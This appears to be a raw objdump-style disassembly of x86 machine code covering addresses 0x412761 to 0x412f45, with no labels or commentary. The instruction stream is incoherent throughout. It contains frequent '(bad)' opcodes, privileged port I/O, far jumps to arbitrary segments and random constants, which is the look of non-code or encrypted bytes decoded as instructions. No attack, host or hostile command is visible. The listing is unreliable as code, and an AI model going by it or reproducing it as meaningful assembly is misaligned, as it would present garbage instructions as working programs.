  412761:	sub    edx,DWORD PTR [ecx-0x3b]
  412764:	addr16 inc edx
  412766:	inc    edi
  412767:	add    BYTE PTR [ebx],al
  412769:	out    0x6c,eax
  41276b:	fsubr  QWORD PTR [edx]
  41276d:	mov    ds:0x28052f84,eax
  412772:	xor    eax,0x644a1a16
  412777:	fwait
  412778:	inc    eax
  412779:	xchg   ebx,eax
  41277a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41277b:	mov    cl,BYTE PTR [ebx]
  41277d:	cmp    eax,0xd87060d3
  412782:	mov    BYTE PTR [ecx],ch
  412784:	pop    edx
  412785:	rol    WORD PTR [edx+0x7],1
  412789:	mov    al,0x93
  41278b:	in     eax,dx
  41278c:	mov    bh,0x68
  41278e:	daa    
  41278f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412790:	adc    DWORD PTR [ecx+esi*2-0x602fca78],eax
  412797:	aaa    
  412798:	ficomp DWORD PTR [ecx-0x6808480e]
  41279e:	xchg   esi,eax
  41279f:	push   ds
  4127a0:	sbb    ah,dh
  4127a2:	push   0x68
  4127a4:	clc    
  4127a5:	or     cl,bh
  4127a7:	(bad)  
  4127a9:	adc    al,0x8
  4127ab:	jno    0x412765
  4127ad:	fimul  WORD PTR [ecx-0x43]
  4127b0:	int    0xd3
  4127b2:	mov    al,ds:0x47f9200b
  4127b7:	jo     0x41275b
  4127b9:	lods   eax,DWORD PTR ds:[esi]
  4127ba:	jl     0x4127af
  4127bc:	or     eax,DWORD PTR [edi-0x7f]
  4127bf:	loop   0x4127fc
  4127c1:	(bad)  
  4127c2:	pop    ebp
  4127c3:	pop    ebp
  4127c4:	fdiv   QWORD PTR [ebx]
  4127c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127c7:	xor    DWORD PTR [ecx-0x5],esp
  4127ca:	mov    ds:0xf8c97bba,al
  4127cf:	div    DWORD PTR [ebx]
  4127d1:	add    dh,bl
  4127d3:	and    BYTE PTR [esp],ah
  4127d6:	imul   ah
  4127d8:	into   
  4127d9:	cdq    
  4127da:	cmp    dh,BYTE PTR [esi+0x60]
  4127dd:	shl    BYTE PTR [esi],cl
  4127df:	or     eax,0x55ff2976
  4127e4:	xor    BYTE PTR [edi+0x45],al
  4127e7:	cmc    
  4127e8:	xor    ch,al
  4127ea:	add    al,0x82
  4127ec:	sub    eax,0x29f25e1a
  4127f1:	pop    ss
  4127f2:	sbb    al,0xd4
  4127f4:	(bad)  
  4127f5:	mov    BYTE PTR [eax-0x3],bh
  4127f8:	and    dh,BYTE PTR [eax+0x57]
  4127fb:	add    esp,DWORD PTR [ebp-0x55]
  4127fe:	lock jbe 0x4127ba
  412801:	mov    eax,0x102946df
  412806:	cmp    BYTE PTR es:[ebx+ecx*2-0x3a],dh
  41280b:	(bad)  
  41280c:	popf   
  41280d:	adc    eax,0xb23c4611
  412812:	std    
  412813:	xor    BYTE PTR [ecx+0x2b],ah
  412816:	(bad)  
  412817:	repz iret 
  412819:	lods   eax,DWORD PTR ds:[esi]
  41281a:	xchg   BYTE PTR [ecx+0x11],al
  41281d:	jns    0x412858
  41281f:	mov    ebp,0x946eadd5
  412824:	mov    dl,0x4f
  412826:	push   ds
  412827:	enter  0xfba7,0x68
  41282b:	mov    ah,0xa7
  41282d:	imul   BYTE PTR [ecx-0x37]
  412830:	icebp  
  412831:	ret    0x9bd5
  412834:	or     BYTE PTR [ebp-0x59],al
  412837:	test   DWORD PTR [ecx-0x17],esi
  41283a:	adc    esi,ebx
  41283c:	fld    TBYTE PTR [ebx+0x3e]
  41283f:	cld    
  412840:	xchg   BYTE PTR [esi-0x36ab0a9f],cl
  412846:	mov    BYTE PTR [esi],0xba
  412849:	into   
  41284a:	or     al,0x6a
  41284c:	push   ebp
  41284d:	jl     0x412805
  41284f:	dec    ecx
  412850:	mov    ch,0x67
  412852:	pop    edx
  412853:	in     eax,0x6a
  412855:	repz add eax,0x2c861493
  41285b:	out    0x12,al
  41285d:	push   ds
  41285e:	in     eax,0xb0
  412860:	cli    
  412861:	push   ds
  412862:	mov    ds:0x40d4c74e,eax
  412867:	pop    es
  412868:	retf   
  412869:	shl    DWORD PTR [ebx],cl
  41286b:	cmp    BYTE PTR [esi-0x54],al
  41286e:	mov    al,0x83
  412870:	sub    dl,bh
  412872:	imul   esi,DWORD PTR [ebp-0x37],0x361ae0b1
  412879:	add    DWORD PTR [edx+0x3e276dfa],ebx
  41287f:	xchg   esi,eax
  412880:	or     BYTE PTR [ebp-0x2cf537c5],bh
  412886:	stos   BYTE PTR es:[edi],al
  412887:	dec    BYTE PTR [eax]
  412889:	jmp    FWORD PTR [edi+0x7b1839a6]
  41288f:	or     eax,0xe1ea3564
  412894:	cwde   
  412895:	lods   al,BYTE PTR ds:[esi]
  412896:	mov    ds:0x850999da,al
  41289b:	sub    DWORD PTR [esi-0x2277c421],edx
  4128a1:	jne    0x4128ba
  4128a3:	mov    ecx,0xa8233bc6
  4128a8:	or     al,0x3a
  4128aa:	(bad)  
  4128ab:	ffreep st(4)
  4128ad:	dec    ebp
  4128ae:	mov    edi,0x4e9bf81b
  4128b3:	sub    al,0x2e
  4128b5:	dec    ebp
  4128b6:	pushf  
  4128b7:	sub    DWORD PTR [eax-0x62],eax
  4128ba:	jg     0x41289f
  4128bc:	sbb    ebx,ebx
  4128be:	or     ah,BYTE PTR ds:[ebx]
  4128c1:	lock and ecx,DWORD PTR [eax-0x4b42375e]
  4128c8:	jle    0x41288f
  4128ca:	inc    ebp
  4128cb:	pop    ecx
  4128cc:	sub    edi,DWORD PTR [eax+0x6ce21ad]
  4128d2:	fimul  DWORD PTR [ebx-0x60756edd]
  4128d8:	sbb    eax,0xff5ec758
  4128dd:	cmp    DWORD PTR [eax-0x1d],esi
  4128e0:	hlt    
  4128e1:	push   edx
  4128e2:	imul   esi,DWORD PTR [ebp+0x70],0x48fb7cb1
  4128e9:	push   ebp
  4128ea:	add    al,0xb4
  4128ec:	mov    WORD PTR [ebp+0x68],ss
  4128ef:	mov    ecx,0xb03f71df
  4128f4:	push   es
  4128f5:	fisttp QWORD PTR [esp+eax*8]
  4128f8:	jge    0x41289e
  4128fa:	pop    eax
  4128fb:	push   ds
  4128fc:	xchg   esp,eax
  4128fd:	lea    edi,[ebp-0x1fccb642]
  412903:	jns    0x412982
  412905:	pushf  
  412906:	cld    
  412907:	mov    BYTE PTR [edx],ch
  412909:	inc    ecx
  41290a:	shl    DWORD PTR [edx+0x49e4dd54],0xd
  412911:	cld    
  412912:	sub    edx,esp
  412914:	inc    esp
  412915:	mov    al,0xe1
  412917:	push   cs
  412918:	push   edx
  412919:	cmc    
  41291a:	out    0x2,eax
  41291c:	gs jp  0x41298b
  41291f:	stos   DWORD PTR es:[edi],eax
  412920:	add    eax,0x343238b4
  412925:	xchg   edi,eax
  412926:	sub    bh,al
  412928:	retf   
  412929:	and    eax,DWORD PTR [edi+0x0]
  41292c:	push   es
  41292d:	push   eax
  41292e:	(bad)  
  41292f:	jae    0x4128ec
  412931:	es ins BYTE PTR es:[edi],dx
  412933:	aaa    
  412934:	(bad)  [eax+edx*2-0x42cf43f]
  41293b:	push   eax
  41293c:	inc    edi
  41293d:	xchg   edi,eax
  41293e:	not    DWORD PTR [edi+0x618fa06e]
  412944:	jle    0x4128f8
  412946:	mov    edi,0x629f42a8
  41294b:	fnstenv [ebp-0x5a1a9b74]
  412951:	fisttp DWORD PTR [ecx+eax*2]
  412954:	inc    edx
  412955:	fild   DWORD PTR [edi]
  412957:	or     esi,DWORD PTR ds:0xb8d34718
  41295d:	dec    edx
  41295e:	xor    BYTE PTR [esi-0x56],bh
  412961:	inc    esi
  412962:	sub    eax,0xa492c71b
  412967:	shr    dl,cl
  412969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41296a:	pop    edx
  41296b:	int    0xd4
  41296d:	jno    0x412992
  41296f:	repnz add DWORD PTR [esi-0x71152064],edx
  412976:	pop    esi
  412977:	or     DWORD PTR [ecx],esp
  412979:	adc    DWORD PTR [ecx-0xf72a3a7],ebx
  41297f:	push   esi
  412980:	adc    eax,0x8010f822
  412985:	or     al,0x4b
  412987:	or     eax,0x912b7e40
  41298c:	xlat   BYTE PTR ds:[ebx]
  41298d:	jmp    0x412a02
  41298f:	push   ss
  412990:	xlat   BYTE PTR ds:[ebx]
  412991:	and    ch,BYTE PTR [eax+0x17f0378]
  412997:	sti    
  412998:	imul   eax,DWORD PTR [esi],0xb819e244
  41299e:	cmp    edx,ecx
  4129a0:	sub    eax,0x3b1f6e9d
  4129a5:	fld    QWORD PTR [ebp-0x6bf1095f]
  4129ab:	jb     0x4129b9
  4129ad:	aaa    
  4129ae:	push   esp
  4129af:	loop   0x412979
  4129b1:	aad    0xf8
  4129b3:	mov    bl,dl
  4129b5:	pop    ds
  4129b6:	jmp    0x412a32
  4129b8:	int    0xe6
  4129ba:	sahf   
  4129bb:	fstp   QWORD PTR [edi-0x5a916bd8]
  4129c1:	pop    esp
  4129c2:	fisttp QWORD PTR [esi]
  4129c4:	cmp    eax,0x7ea91465
  4129c9:	ficomp WORD PTR [eax+0x7ae10bb8]
  4129cf:	mov    ds,WORD PTR ds:0xbdb976a5
  4129d5:	out    dx,eax
  4129d6:	adc    edx,ebx
  4129d8:	cmp    al,BYTE PTR [esi+0x517e7b21]
  4129de:	clc    
  4129df:	fstp   QWORD PTR [esi]
  4129e1:	out    dx,al
  4129e2:	jno    0x412a61
  4129e4:	das    
  4129e5:	rol    edx,cl
  4129e7:	mov    ?,WORD PTR ds:0xf0b5868c
  4129ed:	fnstenv [eax+ebp*2+0x3]
  4129f1:	jmp    0xdb62:0x77ff385f
  4129f8:	xor    BYTE PTR [edx],bl
  4129fa:	sub    eax,0x125ad349
  4129ff:	jns    0x4129ce
  412a01:	or     eax,DWORD PTR [ecx-0xf2dba2b]
  412a07:	sub    al,0x86
  412a09:	sub    eax,0xa9ffdf4
  412a0e:	loopne 0x412a8a
  412a10:	fwait
  412a11:	stos   BYTE PTR es:[edi],al
  412a12:	cli    
  412a13:	test   eax,0x29cd310a
  412a18:	and    eax,0xad008e72
  412a1d:	sub    eax,0x31b5d1f0
  412a22:	push   edi
  412a23:	and    edi,DWORD PTR [edi]
  412a25:	lods   eax,DWORD PTR ds:[esi]
  412a26:	lock shl BYTE PTR [esi],cl
  412a29:	fcomp  DWORD PTR [edi+0x6d]
  412a2c:	and    DWORD PTR [ebx+0x1f],ecx
  412a2f:	add    al,0x6f
  412a31:	(bad)  
  412a32:	icebp  
  412a33:	lods   al,BYTE PTR ds:[esi]
  412a34:	xchg   DWORD PTR [eax],ebp
  412a36:	ret    0x5ecf
  412a39:	add    al,0x7c
  412a3b:	retf   
  412a3c:	jle    0x412a23
  412a3e:	pop    ebp
  412a3f:	stos   BYTE PTR es:[edi],al
  412a40:	pop    ds
  412a41:	dec    edx
  412a42:	push   eax
  412a43:	mov    al,ds:0xedc3c06e
  412a48:	retf   0x70ac
  412a4b:	add    bl,BYTE PTR [edi-0x4b0028d5]
  412a51:	sbb    dl,0xca
  412a54:	mov    dl,0x58
  412a56:	mov    bl,0x79
  412a58:	dec    ebx
  412a59:	shl    DWORD PTR [ecx],0x64
  412a5c:	mov    al,0x5
  412a5e:	cs pusha 
  412a60:	bound  ecx,QWORD PTR [ecx-0x30466bf6]
  412a66:	rcl    BYTE PTR [edi+0x2a68e15b],1
  412a6c:	je     0x412aaa
  412a6e:	push   cs
  412a6f:	or     bh,BYTE PTR [ebx]
  412a71:	in     al,0x3e
  412a73:	jle    0x412a31
  412a75:	in     eax,dx
  412a76:	daa    
  412a77:	(bad)  [esi]
  412a79:	pop    ebx
  412a7a:	mov    BYTE PTR [esi],bh
  412a7c:	add    ch,bl
  412a7e:	aam    0x40
  412a80:	mov    bh,0x54
  412a82:	jnp    0x412a5c
  412a84:	iret   
  412a85:	ss cli 
  412a87:	xchg   ebp,eax
  412a88:	out    dx,eax
  412a89:	xor    eax,0x47536f4c
  412a8e:	mov    eax,ds:0x1ccaa0f1
  412a93:	inc    edx
  412a94:	adc    BYTE PTR [esi],al
  412a96:	push   ds
  412a97:	push   0x3d
  412a99:	or     bl,BYTE PTR [ecx-0x1f]
  412a9c:	repz sbb dl,BYTE PTR [esi-0x186ea176]
  412aa3:	adc    ebx,DWORD PTR [ebx+0x26a4f22d]
  412aa9:	mov    dh,0xaa
  412aab:	out    0xf,eax
  412aad:	in     al,0xc8
  412aaf:	jbe    0x412a66
  412ab1:	pop    ds
  412ab2:	cdq    
  412ab3:	mov    esp,0x501dfe52
  412ab8:	gs imul ebx,edx,0xffffff8e
  412abc:	stos   BYTE PTR es:[edi],al
  412abd:	push   ds
  412abe:	mov    bl,0xfb
  412ac0:	(bad)  
  412ac1:	lods   al,BYTE PTR ds:[esi]
  412ac2:	adc    bl,BYTE PTR [edi+0x4d]
  412ac5:	jo     0x412ad6
  412ac7:	adc    ch,dl
  412ac9:	repz loopne 0x412a9c
  412acc:	ret    0xd4c8
  412acf:	mov    ecx,0xb6e0b94b
  412ad4:	imul   edi,ebx,0x7999a25a
  412ada:	jae    0x412ad2
  412adc:	sbb    al,0xb7
  412ade:	or     eax,0x978c563
  412ae3:	sar    DWORD PTR [esi],1
  412ae5:	fisub  WORD PTR [ecx]
  412ae7:	inc    esp
  412ae8:	jmp    0x69fa:0x93b3a361
  412aef:	mov    dl,0x3f
  412af1:	popf   
  412af2:	pop    es
  412af3:	pop    ebp
  412af4:	jle    0x412a81
  412af6:	pop    ds
  412af7:	inc    edi
  412af8:	adc    eax,0x40f22bf3
  412afd:	and    eax,0xbbff3a17
  412b02:	adc    BYTE PTR [esi],cl
  412b04:	test   edx,esi
  412b06:	cli    
  412b07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b09:	cmp    DWORD PTR [ebx-0x491c7cf8],ebp
  412b0f:	xchg   ebp,eax
  412b10:	popf   
  412b11:	inc    ecx
  412b12:	mov    BYTE PTR [eax],dh
  412b14:	retf   0xd3b0
  412b17:	stos   BYTE PTR es:[edi],al
  412b18:	call   0xcb7f6c5b
  412b1d:	mov    ds:0x5ddd0caf,al
  412b22:	pop    ecx
  412b23:	inc    ebp
  412b24:	in     eax,dx
  412b25:	fbstp  TBYTE PTR [ebx-0x6d964e5]
  412b2b:	mov    ecx,0x5c20a585
  412b30:	xor    eax,0xb652a9a1
  412b35:	jb     0x412b59
  412b37:	jb     0x412b91
  412b39:	xlat   BYTE PTR ds:[ebx]
  412b3a:	ins    BYTE PTR es:[edi],dx
  412b3b:	pop    edx
  412b3c:	xor    eax,edx
  412b3e:	dec    BYTE PTR ds:0x7b0c5904
  412b44:	(bad)  
  412b45:	cmp    ecx,DWORD PTR [edi-0x7c9d3de3]
  412b4b:	adc    al,0x7a
  412b4d:	fnsave [edi+0x3ed2de71]
  412b53:	fild   DWORD PTR ds:0xfab94d3d
  412b59:	add    edx,DWORD PTR [eax]
  412b5b:	mov    dh,0xb4
  412b5d:	or     eax,DWORD PTR [edx]
  412b5f:	fmul   QWORD PTR [ebp-0x25f30930]
  412b65:	jnp    0x412b12
  412b67:	sbb    DWORD PTR [ebx+0x59],esi
  412b6a:	jmp    0xb52bbb60
  412b6f:	jmp    0x396:0x1c5aa542
  412b76:	and    DWORD PTR [ebx-0x1f],esp
  412b79:	ret    
  412b7a:	add    BYTE PTR [ecx+ecx*8-0x27ff1485],al
  412b81:	add    dh,BYTE PTR [esi-0x2d41336d]
  412b87:	sbb    eax,0x2ce51b96
  412b8c:	cli    
  412b8d:	repz mov al,ds:0xc241e10d
  412b93:	mov    dl,0xc6
  412b95:	ds out 0x8d,al
  412b98:	cmp    eax,0xe973daa9
  412b9d:	push   cs
  412b9e:	idiv   DWORD PTR [ecx+0xb]
  412ba1:	stos   DWORD PTR es:[edi],eax
  412ba2:	or     BYTE PTR ds:0xe89d3f80,bl
  412ba8:	scas   al,BYTE PTR es:[edi]
  412ba9:	cmp    BYTE PTR [edx+0x2c],dh
  412bac:	cmp    dl,dh
  412bae:	shr    BYTE PTR [ebx],0x0
  412bb1:	sbb    BYTE PTR [ecx+ebp*1],cl
  412bb4:	cmp    al,0x38
  412bb6:	or     eax,0x7ed42d4e
  412bbb:	test   eax,0xde9a68bf
  412bc0:	pop    eax
  412bc1:	js     0x412c1a
  412bc3:	int3   
  412bc4:	ja     0x412bfd
  412bc6:	outs   dx,DWORD PTR ds:[esi]
  412bc7:	mov    al,ds:0x898c59fc
  412bcc:	add    DWORD PTR [esi-0x19],esp
  412bcf:	push   es
  412bd0:	rol    DWORD PTR [ebp+0x733d6cd4],cl
  412bd6:	cmp    DWORD PTR [edx+0x2a],0xfffffff2
  412bda:	xor    BYTE PTR [edx+0x50],dl
  412bdd:	jmp    0xbbb4:0x36d751f0
  412be4:	inc    eax
  412be5:	inc    esp
  412be6:	enter  0x66a3,0xd8
  412bea:	in     eax,dx
  412beb:	cdq    
  412bec:	mov    edi,0x7686f947
  412bf1:	popf   
  412bf2:	jge    0x412c5e
  412bf4:	sub    ah,BYTE PTR [ecx+0x7d]
  412bf7:	or     dh,ah
  412bf9:	adc    DWORD PTR [ebx+edx*8+0x65],0x60
  412bfe:	mov    ebp,0x5c321f48
  412c03:	pop    edx
  412c04:	adc    DWORD PTR [edx],eax
  412c06:	fimul  DWORD PTR [ebx+0x6f]
  412c09:	inc    esi
  412c0a:	cmp    bh,dl
  412c0c:	shl    edx,0x54
  412c0f:	aaa    
  412c10:	pop    ds
  412c11:	cli    
  412c12:	jno    0x412c8f
  412c14:	mov    eax,0x71c246f6
  412c19:	sbb    ebp,DWORD PTR ds:0xbfdc60ac
  412c1f:	cmp    eax,0xbbf1c796
  412c24:	xlat   BYTE PTR ds:[ebx]
  412c25:	pop    es
  412c26:	sahf   
  412c27:	and    bl,BYTE PTR [eax-0x16722ffb]
  412c2d:	jne    0x412c39
  412c2f:	and    eax,0xa252c77d
  412c34:	in     al,0x6f
  412c36:	mov    esi,0x912bfa8e
  412c3b:	les    eax,FWORD PTR [ecx+0x38]
  412c3e:	mov    eax,edi
  412c40:	lfs    ebx,FWORD PTR [ebx+0x922a87c]
  412c47:	dec    edx
  412c48:	mov    dl,0x72
  412c4a:	out    0xdb,al
  412c4c:	jae    0x412c7a
  412c4e:	jbe    0x412cb8
  412c50:	and    BYTE PTR ds:0xb648bf30,ch
  412c56:	ins    DWORD PTR es:[edi],dx
  412c57:	sti    
  412c58:	rcr    DWORD PTR [ebp+esi*1+0x37],cl
  412c5c:	xchg   BYTE PTR [eax+edx*1-0x79],bl
  412c60:	addr16 cli 
  412c62:	jnp    0x412c4e
  412c64:	inc    ebp
  412c65:	shr    DWORD PTR [bp+si],1
  412c68:	push   edi
  412c69:	out    0xda,al
  412c6b:	rol    BYTE PTR [eax+0x44],cl
  412c6e:	mov    cl,0x42
  412c70:	xor    ch,BYTE PTR [eax-0x59ecae5a]
  412c76:	ja     0x412c16
  412c78:	mov    esi,0x9a043104
  412c7d:	mov    ecx,DWORD PTR [ecx-0x41]
  412c80:	lea    esi,[esi-0x7d571234]
  412c86:	in     eax,0x6
  412c88:	leave  
  412c89:	ss pop edi
  412c8b:	or     eax,edx
  412c8d:	jae    0x412c70
  412c8f:	mov    ?,WORD PTR [ecx]
  412c91:	js     0x412c81
  412c93:	inc    BYTE PTR [edi-0x21fa292a]
  412c99:	sti    
  412c9a:	popa   
  412c9b:	and    esp,DWORD PTR [esi+0x2e]
  412c9e:	pop    ebx
  412c9f:	sub    DWORD PTR [edx-0x74],ecx
  412ca2:	push   edx
  412ca3:	pop    esi
  412ca4:	rol    BYTE PTR [ecx],1
  412ca6:	retf   
  412ca7:	sub    DWORD PTR [ebx+0x466bbe03],esi
  412cad:	pusha  
  412cae:	xor    al,0x47
  412cb0:	enter  0xd82b,0x3c
  412cb4:	sti    
  412cb5:	mov    edi,0x4f97cac6
  412cba:	mov    al,ds:0xcd38b9e1
  412cbf:	clc    
  412cc0:	jge    0x412c99
  412cc2:	mov    eax,ds:0x640fd42e
  412cc7:	jo     0x412cc7
  412cc9:	daa    
  412cca:	mov    dh,0x1b
  412ccc:	jl     0x412cfd
  412cce:	gs repz gs jmp 0x412c63
  412cd3:	fs call 0xa23ae8ce
  412cd9:	jb     0x412c94
  412cdb:	xor    esi,DWORD PTR [ecx+0x5dd117d4]
  412ce1:	lock sub al,0xd
  412ce4:	das    
  412ce5:	or     BYTE PTR [edi+0x770784c9],al
  412ceb:	in     al,dx
  412cec:	les    edi,FWORD PTR [eax+eiz*2-0x18]
  412cf0:	jns    0x412d21
  412cf2:	aam    0x88
  412cf4:	and    esp,0xbde6c4a6
  412cfa:	mov    bl,0x59
  412cfc:	sub    al,0x1e
  412cfe:	ins    DWORD PTR es:[edi],dx
  412cff:	cmp    eax,0xa0b60246
  412d04:	cld    
  412d05:	sub    eax,0xba1b2d06
  412d0a:	mov    bl,0xcf
  412d0c:	push   ebp
  412d0d:	inc    esp
  412d0e:	ss mov esp,0x71852778
  412d14:	push   ebx
  412d15:	lods   eax,DWORD PTR ds:[esi]
  412d16:	mov    ch,0x4e
  412d18:	aam    0x94
  412d1a:	xchg   edi,eax
  412d1b:	outs   dx,DWORD PTR ds:[esi]
  412d1c:	mov    ah,0x69
  412d1e:	mov    WORD PTR [ebx-0x76afe059],ds
  412d24:	push   ebx
  412d25:	cli    
  412d26:	test   ebx,ebp
  412d28:	div    BYTE PTR gs:[edx*4-0x5119372c]
  412d30:	mov    bl,0x46
  412d32:	jae    0x412cee
  412d34:	aam    0x60
  412d36:	enter  0x63bc,0xec
  412d3a:	sbb    eax,0xb1937552
  412d3f:	daa    
  412d40:	pop    esp
  412d41:	(bad)  
  412d42:	sahf   
  412d43:	hlt    
  412d44:	jns    0x412cde
  412d46:	mov    eax,0x19e294e2
  412d4b:	imul   esp,DWORD PTR [ebp-0x7b],0x98f6a2dd
  412d52:	ds jge 0x412d7b
  412d55:	and    al,0x64
  412d57:	add    eax,0x251282dc
  412d5c:	or     al,0xe0
  412d5e:	hlt    
  412d5f:	and    dl,ch
  412d61:	(bad)  
  412d62:	cdq    
  412d63:	xor    eax,0x890f8832
  412d68:	daa    
  412d69:	mov    eax,0x8316c31
  412d6e:	inc    edx
  412d6f:	leave  
  412d70:	outs   dx,BYTE PTR ds:[esi]
  412d71:	movzx  ebp,WORD PTR [edi]
  412d74:	push   edx
  412d75:	or     bl,cl
  412d77:	push   ss
  412d78:	jno    0x412dbc
  412d7a:	test   edi,edi
  412d7c:	idiv   BYTE PTR [ecx]
  412d7e:	in     al,dx
  412d7f:	pop    es
  412d80:	xchg   esp,eax
  412d81:	add    eax,0xbc54c009
  412d86:	add    BYTE PTR [ebx-0x62a46403],cl
  412d8c:	jno    0x412d36
  412d8e:	int3   
  412d8f:	push   es
  412d90:	dec    edx
  412d91:	in     al,dx
  412d92:	or     edx,edi
  412d94:	ret    
  412d95:	sahf   
  412d96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d97:	inc    edx
  412d98:	daa    
  412d99:	scas   eax,DWORD PTR es:[edi]
  412d9a:	mov    ah,0x91
  412d9c:	pushf  
  412d9d:	pop    ds
  412d9e:	inc    ebx
  412d9f:	inc    ebp
  412da0:	test   eax,0x13806747
  412da5:	in     eax,dx
  412da6:	sub    eax,0xbaed24ee
  412dab:	mov    al,0xe4
  412dad:	cld    
  412dae:	and    bh,BYTE PTR fs:[esi-0x1988cb0c]
  412db5:	neg    BYTE PTR [esi]
  412db7:	std    
  412db8:	sbb    ebx,DWORD PTR [edx+edi*8+0x74]
  412dbc:	mov    edx,cr7
  412dbf:	sar    BYTE PTR gs:[ebx+0x575db6d9],cl
  412dc6:	outs   dx,BYTE PTR ds:[esi]
  412dc7:	repnz mov ds:0xc1c2d85a,al
  412dcd:	nop
  412dce:	pop    edi
  412dcf:	leave  
  412dd0:	(bad)  
  412dd1:	sub    edx,ecx
  412dd3:	cmp    ah,BYTE PTR [edx]
  412dd5:	mul    DWORD PTR [ebx]
  412dd7:	push   edi
  412dd8:	cmc    
  412dd9:	mov    ss,esp
  412ddb:	mov    cl,0x4a
  412ddd:	pop    ss
  412dde:	jae    0x412e2c
  412de0:	bound  edx,QWORD PTR [ecx]
  412de2:	clc    
  412de3:	mov    dl,0x50
  412de5:	aam    0xb3
  412de7:	pop    di
  412de9:	test   eax,0x3a7781c1
  412dee:	and    dl,BYTE PTR [edi-0x6e]
  412df1:	xchg   ebp,eax
  412df2:	xor    BYTE PTR [ebp-0x46],bh
  412df5:	fisubr WORD PTR [eax-0x4a]
  412df8:	icebp  
  412df9:	outs   dx,BYTE PTR ds:[esi]
  412dfa:	mov    cl,0x6b
  412dfc:	jno    0x412e2f
  412dfe:	jo     0x412d84
  412e00:	adc    BYTE PTR [edi],dl
  412e02:	je     0x412e1b
  412e04:	in     eax,0x4d
  412e06:	or     eax,0x72923481
  412e0b:	mov    bl,BYTE PTR [ebx-0x3057f03f]
  412e11:	fucomi st,st(1)
  412e13:	mov    es,edi
  412e15:	bound  ebp,QWORD PTR cs:[ecx+0x30bddab9]
  412e1c:	mov    dh,0xdf
  412e1e:	mov    ebp,0xb059bf7c
  412e23:	inc    ecx
  412e24:	cld    
  412e25:	out    0xbe,al
  412e27:	mov    cl,0x9a
  412e29:	cmp    esp,DWORD PTR [edx]
  412e2b:	mov    ds:0x7178975f,al
  412e30:	mov    ?,ecx
  412e32:	cmp    edx,0x654b7c4a
  412e38:	(bad)  
  412e39:	push   ebp
  412e3a:	mov    ecx,esi
  412e3c:	or     eax,0x86041535
  412e41:	inc    esp
  412e42:	sbb    BYTE PTR [ebp+edi*4-0x32f8e3d],bl
  412e49:	jp     0x412e1d
  412e4b:	xlat   BYTE PTR ds:[ebx]
  412e4c:	push   esp
  412e4d:	bound  ebp,QWORD PTR [eax]
  412e4f:	and    al,0x11
  412e51:	ror    BYTE PTR [edx-0x6d],0x31
  412e55:	(bad)  
  412e56:	push   0x1c
  412e58:	mov    ebx,0xa80d47c3
  412e5d:	cs jo  0x412e92
  412e60:	add    BYTE PTR [eax+eax*2+0x41a98975],0x46
  412e68:	stos   BYTE PTR es:[edi],al
  412e69:	mov    BYTE PTR [eax],cl
  412e6b:	sub    dh,dl
  412e6d:	mov    ecx,0xafb33a05
  412e72:	mov    edx,0x59643937
  412e77:	push   ds
  412e78:	arpl   WORD PTR [eax],si
  412e7a:	cmp    al,0xb7
  412e7c:	mov    DWORD PTR ds:0x72a5f284,esi
  412e82:	dec    eax
  412e83:	push   ebp
  412e84:	popf   
  412e85:	jno    0x412eb7
  412e87:	ss push ecx
  412e89:	mov    ah,0x82
  412e8b:	call   0x7ea6:0xa879d7c2
  412e92:	xor    bh,BYTE PTR ds:[ecx-0x3e]
  412e96:	stos   DWORD PTR es:[edi],eax
  412e97:	push   ebx
  412e98:	loopne 0x412e60
  412e9a:	push   esi
  412e9c:	(bad)  
  412e9e:	mov    ds:0xbe3d082e,eax
  412ea3:	es jg  0x412eab
  412ea6:	push   ecx
  412ea7:	add    al,0x2
  412ea9:	je     0x412ee5
  412eab:	loop   0x412eb4
  412ead:	not    BYTE PTR [edx]
  412eaf:	or     bh,BYTE PTR [ebx+0x12115e42]
  412eb5:	dec    esi
  412eb6:	mov    BYTE PTR [esp+eax*2+0x74],ah
  412eba:	adc    al,0xed
  412ebc:	jge    0x412f04
  412ebe:	cld    
  412ebf:	or     ch,al
  412ec1:	les    ebp,FWORD PTR [ebp+0x56]
  412ec4:	xlat   BYTE PTR ds:[ebx]
  412ec5:	xchg   DWORD PTR [eax+eiz*2+0x48],edx
  412ec9:	push   ds
  412eca:	out    0xaf,al
  412ecc:	jnp    0x412e79
  412ece:	cwde   
  412ecf:	fldenv [ecx+0x3b]
  412ed2:	daa    
  412ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ed4:	mov    cl,0x74
  412ed6:	inc    ebp
  412ed7:	(bad)  
  412ed9:	jo     0x412e97
  412edb:	push   edx
  412edc:	or     DWORD PTR [eax],ebx
  412ede:	sub    eax,0xa0503771
  412ee3:	mov    ch,0x6f
  412ee5:	or     ebx,DWORD PTR [eax-0x4]
  412ee8:	inc    edi
  412ee9:	cdq    
  412eea:	cwde   
  412eeb:	xor    DWORD PTR [ebp-0x66],eax
  412eee:	ror    DWORD PTR [esp+eiz*4],0x87
  412ef2:	sbb    eax,DWORD PTR [edi]
  412ef4:	push   ecx
  412ef5:	pop    esp
  412ef6:	cmp    BYTE PTR [edx+0x3eb4c6c2],cl
  412efc:	ins    DWORD PTR es:[edi],dx
  412efd:	shl    esp,cl
  412eff:	xor    DWORD PTR [ecx],eax
  412f01:	sub    BYTE PTR [edi+0x10c565],ch
  412f07:	lahf   
  412f08:	push   edx
  412f09:	arpl   WORD PTR [esi+0x29088e19],bp
  412f0f:	fs gs dec edx
  412f12:	mov    bl,0x68
  412f14:	es mov ebp,0x2cb01ab0
  412f1a:	sbb    dl,dh
  412f1c:	pop    ebp
  412f1d:	popf   
  412f1e:	adc    al,0xfb
  412f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f21:	cmc    
  412f22:	sub    eax,0xe2e8c7b4
  412f27:	ins    BYTE PTR es:[edi],dx
  412f28:	aas    
  412f29:	psrlw  mm1,QWORD PTR [eax-0x27722c63]
  412f30:	jne    0x412eec
  412f32:	int    0x6c
  412f34:	fld    QWORD PTR [edi]
  412f36:	or     esp,DWORD PTR [ecx+0x223ec618]
  412f3c:	cwde   
  412f3d:	jmp    0x8c38:0xd292d3b7
  412f44:	inc    esi
  412f45:	in     eax,0xa6
